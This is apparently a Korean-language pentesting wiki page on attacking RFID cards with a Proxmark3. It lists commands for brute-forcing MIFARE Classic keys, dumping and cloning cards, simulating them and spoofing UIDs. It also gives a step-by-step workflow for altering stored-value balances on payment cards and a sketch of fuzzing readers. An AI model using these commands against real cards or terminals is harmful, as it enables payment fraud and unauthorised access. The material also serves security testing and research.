# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3로 RFID 시스템 공격하기

활발히 유지 관리되는 RRG/Iceman Proxmark3 client와 이에 맞는 firmware를 설치한 다음, 아래에 나온 이전 명령은 변경되었을 수 있으므로 해당 빌드에서 명령 구문을 확인하세요.<sup>[[1]](#references)[[5]](#references)</sup>

### MIFARE Classic 1KB 공격하기

MIFARE Classic 1K에는 **16개 섹터**가 있으며, 각 섹터는 **16바이트 블록 4개**로 구성됩니다. 제조사 블록 0에는 UID/제조사 데이터가 들어 있으며, 정품 NXP 카드에서는 읽기 전용입니다. 특수 복제 카드나 “magic” 카드에서는 이 블록을 다시 쓸 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>\
각 섹터에 접근하려면 **2개의 키**(**A**와 **B**)가 필요하며, 이 키는 각 섹터의 **블록 3**(섹터 트레일러)에 저장됩니다. 섹터 트레일러에는 두 키를 사용해 **각 블록의 읽기 및 쓰기** 권한을 설정하는 **접근 비트**도 저장됩니다.\
예를 들어 첫 번째 키를 알고 있으면 읽기 권한을, 두 번째 키를 알고 있으면 쓰기 권한을 부여하는 식으로 두 키를 활용할 수 있습니다.

여러 공격을 수행할 수 있습니다

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Proxmark3를 사용하면 **도청**과 같은 다른 작업도 수행할 수 있습니다. 예를 들어 **Tag to Reader 통신**을 도청해 민감한 데이터를 찾을 수 있습니다. 이 카드의 경우, 통신을 스니핑하고 사용된 키를 계산할 수 있습니다. **사용된 암호화 연산이 취약**하고 평문과 암호문을 알고 있으면 키를 계산할 수 있기 때문입니다(`mfkey64` 도구).<sup>[[3]](#references)</sup>

#### 저장 가치 악용을 위한 MiFare Classic 빠른 워크플로

단말기가 Classic 카드에 잔액을 저장하는 경우, 일반적인 엔드투엔드 흐름은 다음과 같습니다.<sup>[[4]](#references)</sup>

```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```

참고 사항

- `hf mf autopwn`은 nested/darkside/HardNested 스타일 공격을 자동으로 수행하고, 키를 복구하며, 클라이언트 dumps 폴더에 덤프를 생성합니다.<sup>[[1]](#references)</sup>
- 블록 0/UID 쓰기는 magic gen1a/gen2 카드에서만 작동합니다. 일반 Classic 카드의 UID는 읽기 전용입니다.<sup>[[2]](#references)</sup>
- 많은 배포 환경에서 Classic "value blocks" 또는 간단한 체크섬을 사용합니다. 편집 후에는 모든 복제/보수 필드와 체크섬이 일관되도록 해야 합니다.<sup>[[4]](#references)</sup>

상위 수준의 방법론과 완화책은 다음을 참조하세요.

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw 명령어

IoT 시스템은 때때로 **브랜드가 없거나 상용 제품이 아닌 태그**를 사용합니다. 이런 경우 Proxmark3를 사용해 **태그에 사용자 지정 raw commands를 전송**할 수 있습니다.

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

이 정보를 바탕으로 카드와 카드와 통신하는 방법에 관한 정보를 검색해 볼 수 있습니다. Proxmark3에서는 다음과 같은 raw 명령을 보낼 수 있습니다. `hf 14a raw -p -b 7 26`

### 스크립트

Proxmark3 소프트웨어에는 간단한 작업을 수행하는 데 사용할 수 있는 **자동화 스크립트** 목록이 미리 포함되어 있습니다. 전체 목록을 보려면 `script list` 명령을 사용하세요. 그런 다음 `script run` 명령 뒤에 스크립트 이름을 입력하세요:

```
proxmark3> script run mfkeys
```

**tag reader를 fuzzing**하는 script를 만들 수 있습니다. **valid card**의 데이터를 복사한 다음, 하나 이상의 임의 **byte**를 **randomize**하는 **Lua script**를 작성하고 각 반복에서 **reader가 crash하는지** 확인하면 됩니다.

## References

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [MIFARE Classic Crypto1에 관한 NXP의 입장](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [KioSoft Stored Value에서 NFC 카드 취약점 악용](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linux 설치](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
